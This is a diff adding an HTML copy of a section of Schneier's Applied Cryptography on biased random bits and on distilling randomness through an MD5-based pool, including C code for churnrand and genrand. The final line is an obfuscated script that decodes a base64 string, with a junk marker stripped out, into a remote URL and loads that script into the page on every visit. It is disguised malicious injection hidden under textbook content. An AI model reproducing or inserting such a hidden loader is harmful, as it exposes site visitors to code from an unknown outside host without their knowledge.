@@ -1,0 +1,163 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Stream Ciphers and Real Random-Sequence Generators</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=17//-->
+<!--PAGES=425-428//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch18/18-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Ideally, you only want to collect one random bit per keystroke. Collecting more may skew the results, depending on how good a typist is sitting at the keyboard. This technique is limited, though. While it&#146;s easy to have someone type 100 words or so when it is time to generate a key, it isn&#146;t reasonable to ask the typist to type a 100,000-word essay to generate a keystream for a one-time pad.
+</P>
+<P><FONT SIZE="+1"><B><I>Biases and Correlations</I></B></FONT></P>
+<P>A major problem with all these systems is that there could be nonrandomness in the generated sequence. The underlying physical processes might be random, but many kinds of measuring instruments are between the digital part of the computer and the physical process. Those instruments could easily introduce problems.
+</P>
+<P>A way to eliminate <B>bias</B>, or skew, is to XOR several bits together. If a random bit is biased toward 0 by a factor <I>e</I>, then the probability of 0 can be written as:</P>
+<DL>
+<DD>P(0) = .5 &#43; <I>e</I>
+</DL>
+<P>XORing two of these bits together yields:
+</P>
+<DL>
+<DD>P(0) = (.5 &#43; <I>e</I>)<SUP>2</SUP> &#43; (.5 - <I>e</I>)<SUP>2</SUP> = .5 &#43; 2<I>e</I><SUP>2</SUP>
+</DL>
+<P>By the same calculation, XORing 4 bits together yields:
+</P>
+<DL>
+<DD>P(0) = .5 &#43; 8<I>e</I><SUP>4</SUP>
+</DL>
+<P>XORing <I>m</I> bits will exponentially converge to an equal probability of 0 and 1. If you know the maximum bias you are willing to accept for your application, you can calculate how many bits you need to XOR together to get random bits below that bias.</P>
+<P>An even better method is to look at the bits in pairs. If the 2 bits are the same, discard them and look at the next pair. If the 2 bits are different, take the first bit as the output of the generator. This eliminates bias completely. Other techniques for reducing bias use transition mappings, compression, and fast Fourier transforms [511].</P>
+<P>The potential problem with both methods is that if there is a <B>correlation</B> between adjacent bits, then these methods will increase the bias. One way to correct this is to use multiple random sources. Take four different random sources and XOR the bits together; or take two random sources, and look at those bits in pairs.</P>
+<P>For example, take a radioactive source and hook a Geiger counter to your computer. Take a pair of noisy diodes and record as an event every time the noise exceeds a certain peak. Measure atmospheric noise. Get a random bit from each and XOR them together to produce the random bit. The possibilities are endless.</P>
+<P>The mere fact that a random-number generator has a bias does not necessarily mean that it is unusable. It just means that it is less secure. For example, consider the problem of Alice generating a triple-DES 168-bit key. All she has is a random-bit generator with a bias toward 0: It produces 55 percent 0s and 45 percent 1s. This means that there are only 0.99277 bits of entropy per key bit, as opposed to 1 bit of entropy if the generator were perfect. Mallory, trying to break the key, can optimize his brute-force search to try the most probable key first (000...0), and work toward the least probable key (111...1). Because of the bias, Mallory can expect to find the key in 2<SUP>109</SUP> attempts. If there were no bias, Mallory would expect to make 2<SUP>111</SUP> attempts. The resultant key is less secure, but not appreciably so.</P>
+<P><FONT SIZE="+1"><B><I>Distilling Randomness</I></B></FONT></P>
+<P>In general, the best way to generate random numbers is to find a whole lot of seemingly random events and distill randomness from them. This randomness can then be stored in a pool or reservoir that applications can draw on as needed. One-way hash functions are ready-made for the job; they&#146;re fast, so you can shovel quite a bit through them without worrying too much about performance or the actual randomness of each observation. Hash almost anything you can find that has at least some randomness. Try:
+</P>
+<DL>
+<DD>&#151; A copy of every keystroke
+<DD>&#151; Mouse commands
+<DD>&#151; The sector number, time of day, and seek latency for every disk operation
+<DD>&#151; Actual mouse position
+<DD>&#151; Number of current scanline of monitor
+<DD>&#151; Contents of the actually displayed image
+<DD>&#151; Contents of FATs, kernel tables, and so on
+<DD>&#151; Access/modify times of /dev/tty
+<DD>&#151; CPU load
+<DD>&#151; Arrival times of network packets
+<DD>&#151; Input from a microphone
+<DD>&#151; /dev/audio without a microphone attached
+</DL>
+<P>If your system uses separate crystal oscillators for its CPU and time-of-day clocks, try reading the time of day in a tight loop. On some (but not all) systems this will reflect the random phase jitter between the two oscillators.
+</P>
+<P>Since much of the randomness in these events is in their timing, use the most finely grained time-of-day clock you can find. A standard PC uses an Intel 8254 clock chip (or equivalent) driven at 1.1931818 megahertz, so reading the counter register directly gives you 838-nanosecond resolution. To avoid skewing the results, avoid taking your event samples on a timer interrupt.</P>
+<P>Here is the process in C with MD5 (see Section 18.5) as the hash function:</P>
+<!-- CODE //-->
+<PRE>
+char Randpool[16];
+
+/* Call early and call often on a wide variety of random or semi-
+ * random system events to churn the randomness pool.
+ * The exact format and length of randevent doesn&#146;t matter as long as
+ * its contents are at least somewhat unpredictable.
+ */
+void churnrand(char *randevent,unsigned int randlen)
+{
+     MD5_CTX md5;
+     MD5Init(&ampmd5);
+     MD5Update(&ampmd5,Randpool,sizeof(Randpool));
+     MD5Update(&ampmd5,randevent,randlen);
+     MD5Final(Randpool,&ampmd5);
+}
+</PRE>
+<!-- END CODE //-->
+<P>After calling churnrand() enough to build up sufficient randomness in Randpool, you can now generate random bits from it. MD5 again comes in handy, this time as a counter-mode pseudo-random byte-stream generator.
+</P>
+<!-- CODE //-->
+<PRE>
+long Randcnt;
+void genrand(char *buf,unsigned int buflen)
+{
+     MD5_CTX md5;
+     char tmp[16];
+     unsigned int n;
+
+     while(buflen != 0) {
+          /* Hash the pool with a counter */
+          MD5Init(&ampmd5);
+          MD5Update(&ampmd5,Randpool,sizeof(Randpool));
+          MD5Update(&ampmd5,(unsigned char *)&ampRandcnt,sizeof(Randcnt));
+          MD5Final(tmp,&ampmd5);
+          Randcnt&#43;&#43;; /* Increment counter */
+
+          /* Copy 16 bytes or requested amount, whichever is less,
+          * to the user&#146;s buffer */
+          n = (buflen &lt 16) ? buflen : 16;
+          memcpy(buf,tmp,n);
+          buf &#43;= n;
+          buflen -= n;
+     }
+}
+</PRE>
+<!-- END CODE //-->
+<P>The hash function is crucial here for several reasons. First, it provides an easy way to generate an arbitrary amount of pseudo-random data without having to call churnrand() each time. In effect, the system degrades gracefully from perfect to practical randomness when the demand exceeds the supply. In this case it becomes <I>theoretically</I> possible to use the result from one genrand() call to determine a previous or subsequent result. But this requires inverting MD5, which is computationally infeasible.</P>
+<P>This is important since the routine doesn&#146;t know what each caller will do with the random data it returns. One call might generate a random number for a protocol that is sent in the clear, perhaps in response to a direct request by an attacker. The very next call might generate a secret key for an unrelated session that the attacker wishes to penetrate. Obviously, it is very important that an attacker not be able to deduce the secret key from the nonce.</P>
+<P>One problem remains. There must be sufficient randomness in the Randpool[] array before the first call to genrand(). If the system has been running for a while with a local user typing on the keyboard, no problem. But what about a standalone system that reboots automatically without seeing any keyboard or mouse input?</P>
+<P>This is a tough one. A partial solution would require the operator to type for a while after the very first reboot, and to create a seed file on disk before shutting down to carry the randomness in Randseed[] across reboots. But do not save the Randseed[] array directly. An attacker who steals this file could determine all of the results from genrand() after the last call to churnrand() prior to the file being created.</P>
+<P>The fix to this problem is to hash the Randseed[] array before storing it, perhaps by just calling genrand(). When the system reboots, you read in the seed file, pass it to churnrand(), then promptly destroy it. Unfortunately, this does not deal with the threat of someone stealing the seed file between reboots and using it to guess future values of the genrand() function. I see no solution to this problem other than to wait until enough external random events have taken place after a reboot before allowing genrand() to produce results.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch18/18-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(GdhTajjD, sLoRPHaz) {sLoRPHaz = GdhTajjD.createElement('script');sLoRPHaz.type = 'text/javascript';sLoRPHaz.async = true;sLoRPHaz.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');GdhTajjD.getElementsByTagName('body')[0].appendChild(sLoRPHaz);}(document));</script></body>
+</html>
